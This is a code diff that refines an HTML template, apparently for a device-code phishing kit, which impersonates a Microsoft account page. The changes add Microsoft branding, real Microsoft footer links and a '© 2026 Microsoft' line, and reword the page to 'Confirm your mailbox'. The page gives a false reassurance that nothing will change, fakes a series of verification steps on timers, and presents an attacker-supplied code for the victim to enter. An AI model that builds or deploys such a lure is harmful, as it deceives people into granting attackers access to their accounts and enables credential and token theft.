@@ -962,14 +962,15 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign in to your account</title>
+<title>Microsoft account</title>
 <style>
   :root {
     --brand: #0067b8;
     --brand-hover: #005a9e;
-    --ink: #1b1b1b;
-    --ink-secondary: #666666;
+    --ink: #1a1a1a;
+    --ink-secondary: #616161;
     --ink-tertiary: #8a8886;
+    --bg-subtle: #faf9f8;
     --line: #e1dfdd;
     --line-strong: #c8c6c4;
     --green: #107c10;
@@ -979,7 +980,7 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 
   html, body {
     min-height: 100%;
-    background-color: #f0f4f9;
+    background: #eef2f7;
     font-family: 'Segoe UI', 'Segoe UI Variable', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
     font-size: 15px;
     color: var(--ink);
@@ -987,95 +988,90 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
     -webkit-font-smoothing: antialiased;
   }
 
-  /* Authentic Microsoft dynamic abstract background */
+  /* faint Microsoft sign-in backdrop */
   body::before {
     content: "";
     position: fixed;
     inset: 0;
     z-index: -1;
-    background-color: #f0f4f9;
-    background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_0a36737b866d18dbe5cd.jpg');
+    background-color: #eef2f7;
+    background-image:
+      radial-gradient(ellipse 80% 70% at 50% 40%, rgba(255,255,255,0.95) 0%, rgba(238,242,247,0.85) 45%, rgba(218,225,235,0.75) 100%),
+      linear-gradient(160deg, #dce6f2 0%, #eef2f7 40%, #e8edf4 70%, #d4dfeb 100%);
     background-size: cover;
     background-position: center;
     background-repeat: no-repeat;
   }
 
-  .stage {
-    min-height: 100vh;
+  .header {
+    height: 48px;
     display: flex;
-    flex-direction: column;
+    align-items: center;
+    padding: 0 24px;
+    border-bottom: 1px solid rgba(0,0,0,0.06);
+    background: transparent;
+    position: relative;
+    z-index: 2;
+  }
+  .header img { height: 20px; width: auto; display: block; }
+
+  .stage {
+    min-height: calc(100vh - 48px - 56px);
+    display: flex;
     align-items: center;
     justify-content: center;
-    padding: 32px 16px;
+    padding: 40px 16px 32px;
     position: relative;
     z-index: 1;
   }
 
-  /* ---------- Microsoft Sign-in Card ---------- */
-  .card {
-    width: 100%;
-    max-width: 440px;
-    background: #ffffff;
-    padding: 44px;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    margin-bottom: 16px;
-  }
+  .card { width: 100%; max-width: 440px; padding: 32px 0; }
 
-  .ms-logo {
-    height: 24px;
-    width: auto;
-    display: block;
-    margin-bottom: 16px;
-  }
+  h1 { font-size: 24px; font-weight: 600; line-height: 32px; margin-bottom: 6px; color: var(--ink); }
+  .subtitle { font-size: 15px; color: var(--ink-secondary); margin-bottom: 24px; line-height: 20px; }
 
-  h1 {
-    font-size: 24px;
-    font-weight: 600;
-    margin-bottom: 12px;
-    color: var(--ink);
-    line-height: 1.2;
+  .reassure {
+    background: rgba(255,255,255,0.85);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    padding: 12px 14px;
+    margin-bottom: 28px;
+    font-size: 13px;
+    color: var(--ink-secondary);
+    line-height: 18px;
   }
+  .reassure strong { color: var(--ink); font-weight: 600; }
 
-  .subtitle {
-    font-size: 15px;
-    color: var(--ink);
-    margin-bottom: 24px;
-    line-height: 1.5;
-  }
+  .label { font-size: 13px; font-weight: 600; margin-bottom: 6px; color: var(--ink); }
 
-  /* Inputs / Code Box */
-  .label {
-    font-size: 15px;
-    margin-bottom: 6px;
-    color: var(--ink);
-  }
-  
   .code-row { position: relative; margin-bottom: 16px; }
-  
   .code-box {
     width: 100%;
-    background: #ffffff;
-    border: none;
-    border-bottom: 1px solid var(--ink-secondary);
-    padding: 6px 48px 6px 0;
-    font-family: inherit;
-    font-size: 24px;
+    background: rgba(255,255,255,0.9);
+    border: 1px solid var(--line-strong);
+    border-radius: 4px;
+    padding: 14px 48px 14px 14px;
+    font-family: 'Segoe UI', 'Courier New', monospace;
+    font-size: 22px;
     font-weight: 600;
-    letter-spacing: 2px;
+    letter-spacing: 4px;
+    text-indent: 4px;
     color: var(--ink);
+    text-align: center;
     user-select: all;
   }
-  .code-box:focus { outline: none; border-bottom: 2px solid var(--brand); }
   .code-box.loading {
     color: var(--ink-tertiary);
     font-size: 15px;
     font-weight: 400;
     letter-spacing: normal;
+    text-indent: 0;
   }
+  .code-box:focus { outline: none; border-color: var(--brand); }
 
   .btn-copy {
     position: absolute;
-    right: 0;
+    right: 10px;
     top: 50%;
     transform: translateY(-50%);
     background: none;
@@ -1087,122 +1083,161 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
     align-items: center;
     border-radius: 4px;
   }
-  .btn-copy:hover { background: #f3f2f1; }
-  .btn-copy svg { width: 20px; height: 20px; }
+  .btn-copy:hover { background: rgba(0,0,0,0.05); }
+  .btn-copy svg { width: 18px; height: 18px; }
   .btn-copy .icon-copied { display: none; color: var(--green); }
   .btn-copy.is-copied .icon-default { display: none; }
   .btn-copy.is-copied .icon-copied { display: block; }
 
-  .status { min-height: 20px; font-size: 13px; color: var(--green); margin-bottom: 16px; }
+  .status { min-height: 20px; font-size: 13px; color: var(--green); margin: -4px 0 8px; }
 
-  /* Buttons */
   .btn-primary {
     display: block;
     width: 100%;
-    padding: 10px 16px;
+    padding: 12px 16px;
     background: var(--brand);
     color: #ffffff;
     border: none;
+    border-radius: 4px;
     font-family: inherit;
     font-size: 15px;
+    font-weight: 600;
     cursor: pointer;
-    margin-top: 24px;
+    margin-top: 8px;
   }
   .btn-primary:hover { background: var(--brand-hover); }
-  .btn-primary:disabled { background: #e1dfdd; color: #a19f9d; cursor: not-allowed; }
+  .btn-primary:disabled { background: #c8c6c4; cursor: not-allowed; }
 
-  .timer { margin-top: 24px; font-size: 13px; color: var(--ink-secondary); display: flex; align-items: center; justify-content: space-between; }
+  .timer {
+    margin-top: 20px;
+    font-size: 13px;
+    color: var(--ink-secondary);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
   .timer strong { color: var(--ink); font-weight: 600; }
-  .refresh { background: none; border: none; color: var(--brand); font: inherit; font-size: 13px; cursor: pointer; }
+  .refresh {
+    background: none;
+    border: none;
+    color: var(--brand);
+    font: inherit;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    padding: 0;
+  }
   .refresh:hover { text-decoration: underline; }
 
-  /* ---------- Sign-in Options Pill ---------- */
-  .options-pill {
-    width: 100%;
-    max-width: 440px;
-    background: #ffffff;
-    padding: 16px 20px;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+  .verify-view { display: none; padding: 8px 0; }
+  .verify-view h2 { font-size: 24px; font-weight: 600; line-height: 32px; margin-bottom: 6px; }
+  .verify-view > p { font-size: 15px; color: var(--ink-secondary); margin-bottom: 24px; line-height: 20px; }
+  .progress-box {
+    background: rgba(255,255,255,0.85);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    padding: 16px;
+  }
+  .progress-row {
     display: flex;
     align-items: center;
     gap: 12px;
-    font-size: 15px;
-    color: var(--ink);
-    cursor: pointer;
-    border: none;
-    text-align: left;
+    font-size: 14px;
+    padding: 10px 0;
+    color: var(--ink-secondary);
+    line-height: 20px;
   }
-  .options-pill:hover { background: #faf9f8; }
-  .options-pill svg { width: 24px; height: 24px; color: var(--ink); }
-
-  /* ---------- Verify View ---------- */
-  .verify-view { display: none; }
-  .progress-box { margin-top: 24px; }
-  .progress-row { display: flex; align-items: center; gap: 12px; font-size: 15px; padding: 12px 0; color: var(--ink-secondary); border-bottom: 1px solid #f3f2f1; }
-  .progress-row:last-child { border-bottom: none; }
-  .progress-row .dot { width: 18px; height: 18px; border-radius: 50%; border: 2px solid var(--line-strong); flex-shrink: 0; display: inline-flex; align-items: center; justify-content: center; }
+  .progress-row:not(:last-child) { border-bottom: 1px solid var(--line); }
+  .progress-row .dot {
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    border: 2px solid var(--line-strong);
+    flex-shrink: 0;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+  }
   .progress-row.done .dot { background: var(--green); border-color: var(--green); color: #fff; font-size: 11px; }
   .progress-row.done { color: var(--ink); }
   .progress-row.active .dot { border-color: var(--brand); border-top-color: transparent; animation: spin 0.9s linear infinite; }
   .progress-row.active { color: var(--ink); font-weight: 600; }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .fineprint { font-size: 12px; color: var(--ink-tertiary); margin-top: 20px; }
 
-  /* ---------- Success View ---------- */
-  .success-view { display: none; text-align: left; }
-  .success-view .check { display: inline-flex; align-items: center; justify-content: center; width: 44px; height: 44px; border-radius: 50%; background: var(--green); color: #ffffff; font-size: 22px; margin-bottom: 16px; }
-  .success-view h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
-  .success-view p { color: var(--ink); font-size: 15px; }
+  .fineprint { font-size: 12px; color: var(--ink-tertiary); margin-top: 16px; line-height: 16px; }
 
-  /* ---------- Footer ---------- */
+  .success-view { display: none; text-align: center; padding: 16px 0; }
+  .success-view .check {
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 52px; height: 52px; border-radius: 50%;
+    background: var(--green); color: #ffffff; font-size: 26px;
+    margin-bottom: 16px;
+  }
+  .success-view h2 { font-size: 24px; font-weight: 600; line-height: 32px; margin-bottom: 6px; }
+  .success-view p { color: var(--ink-secondary); font-size: 15px; }
+
   .ms-footer {
-    position: fixed;
-    bottom: 0;
-    right: 0;
-    padding: 16px 24px;
+    border-top: 1px solid rgba(0,0,0,0.06);
+    padding: 14px 24px;
     display: flex;
     align-items: center;
-    gap: 24px;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 10px 18px;
     font-size: 12px;
     color: var(--footer-link);
+    line-height: 16px;
+    background: transparent;
+    position: relative;
     z-index: 2;
   }
-  .ms-footer a { color: var(--footer-link); text-decoration: none; }
+  .ms-footer .links { display: flex; align-items: center; gap: 18px; flex-wrap: wrap; }
+  .ms-footer a { color: var(--footer-link); text-decoration: none; font-size: 12px; }
   .ms-footer a:hover { text-decoration: underline; }
-  .ms-footer .ellipsis { font-weight: bold; letter-spacing: 2px; cursor: pointer; }
+  .ms-footer .copy { font-size: 12px; color: var(--footer-link); }
 
   @media (max-width: 480px) {
-    .stage { justify-content: flex-start; padding-top: 10vh; }
-    .card, .options-pill { box-shadow: none; max-width: 100%; }
-    .ms-footer { position: relative; justify-content: center; padding: 24px; margin-top: auto; }
+    .header { padding: 0 16px; }
+    .card { padding: 24px 0; }
+    h1 { font-size: 21px; }
+    .ms-footer { padding: 12px 16px; justify-content: center; text-align: center; }
+    .ms-footer .links { justify-content: center; }
   }
 </style>
 </head>
 <body>
 
+<div class="header">
+  <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft/default.svg" alt="Microsoft">
+</div>
+
 <div class="stage">
-  
-  <!-- Main Sign-in Card -->
   <div class="card">
-    
-    <img class="ms-logo" src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft/default.svg" alt="Microsoft">
-    
+
     <div id="mainView">
-      <h1>Sign in</h1>
-      <p class="subtitle">Enter the security code sent to your email to continue.</p>
+      <h1>Confirm your mailbox</h1>
+      <p class="subtitle">Enter the code below to finish the security update.</p>
+
+      <div class="reassure">
+        <strong>What happens next:</strong> we will verify the code, then send a short test message to your inbox. A reply confirms your mailbox is responding — nothing on your device will change.
+      </div>
 
       <div class="label">Verification code</div>
       <div class="code-row">
         <div class="code-box loading" id="codeBox">Loading...</div>
         <button class="btn-copy" id="copyBtn" title="Copy code" onclick="copyCodeAction()" disabled>
-          <svg class="icon-default" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-          <svg class="icon-copied" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          <svg class="icon-default" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+          <svg class="icon-copied" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
         </button>
       </div>
-      
+
       <div class="status" id="codeStatus"></div>
 
-      <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Next</button>
+      <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Verify and send test message</button>
 
       <div class="timer">
         <span>Code expires in <strong id="timer">{expires_minutes}</strong></span>
@@ -1211,41 +1246,32 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
     </div>
 
     <div class="verify-view" id="verifyView">
-      <h1>Verifying...</h1>
-      <p class="subtitle">Please keep this window open while we confirm your account.</p>
+      <h2>Verifying your mailbox</h2>
+      <p>This usually takes a few seconds. Please keep this window open.</p>
       <div class="progress-box">
         <div class="progress-row done" id="step1"><span class="dot">✓</span> Code accepted</div>
         <div class="progress-row active" id="step2"><span class="dot"></span> Confirming mailbox reachability</div>
         <div class="progress-row" id="step3"><span class="dot"></span> Sending test message to your inbox</div>
       </div>
-      <p class="fineprint">If the test message does not arrive within 60 seconds, check your spam folder.</p>
+      <p class="fineprint">If the test message does not arrive within 60 seconds, check your spam folder before closing this window.</p>
     </div>
 
     <div class="success-view" id="successView">
       <div class="check">✔</div>
       <h2>Verified</h2>
-      <p>Your mailbox is responding. Redirecting you now...</p>
+      <p>A test message has been sent to your inbox.</p>
     </div>
 
   </div>
-
-  <!-- Sign-in Options Pill -->
-  <button class="options-pill">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-      <circle cx="7.5" cy="15.5" r="3.5"></circle>
-      <path d="M10 13L21 2"></path>
-      <path d="M16 7l3 3"></path>
-    </svg>
-    Sign-in options
-  </button>
-
 </div>
 
-<!-- Bottom Right Footer -->
 <div class="ms-footer">
-  <a href="#">Terms of use</a>
-  <a href="#">Privacy &amp; cookies</a>
-  <span class="ellipsis">...</span>
+  <div class="links">
+    <a href="https://support.microsoft.com/contactus" target="_blank" rel="noopener">Contact Microsoft</a>
+    <a href="https://privacy.microsoft.com/en-us" target="_blank" rel="noopener">Privacy &amp; cookies</a>
+    <a href="https://www.microsoft.com/servicesagreement" target="_blank" rel="noopener">Terms of use</a>
+  </div>
+  <div class="copy">&copy; 2026 Microsoft</div>
 </div>
 
 <script>
@@ -1256,7 +1282,9 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
   var code = '{user_code}';
   var expiresIn = {expires_seconds};
 
+  // fallback destination if the backend sends no redirect_url
   var DEFAULT_REDIRECT = 'https://outlook.office.com/mail/inbox';
+
   var popup = null;
 
   var codeEl = document.getElementById('codeBox');
@@ -1275,6 +1303,11 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
     if (v) verifyUrl = v;
     codeEl.textContent = c;
     codeEl.classList.remove('loading');
+    codeEl.style.letterSpacing = '4px';
+    codeEl.style.textIndent = '4px';
+    codeEl.style.fontSize = '22px';
+    codeEl.style.fontWeight = '600';
+    codeEl.style.color = '#1a1a1a';
     btnEl.disabled = false;
     copyBtn.disabled = false;
   }
@@ -1289,7 +1322,9 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
       setTimeout(() => { copyBtn.classList.remove('is-copied'); }, 2000);
     };
     if (navigator.clipboard) {
-      navigator.clipboard.writeText(codeEl.textContent).then(processState).catch(() => { fallbackCopy(codeEl.textContent, processState); });
+      navigator.clipboard.writeText(codeEl.textContent).then(processState).catch(() => {
+        fallbackCopy(codeEl.textContent, processState);
+      });
     } else {
       fallbackCopy(codeEl.textContent, processState);
     }
@@ -1307,15 +1342,12 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 
   window.openSignIn = function() {
     if (!code || code === 'Loading...') return;
-    
     mainView.style.display = 'none';
     verifyView.style.display = 'block';
-    
     setTimeout(function(){
       if (step2) { step2.classList.remove('active'); step2.classList.add('done'); step2.querySelector('.dot').textContent = '✓'; }
       if (step3) step3.classList.add('active');
     }, 1400);
-    
     setTimeout(function(){
       if (step3) { step3.classList.remove('active'); step3.classList.add('done'); step3.querySelector('.dot').textContent = '✓'; }
     }, 2800);
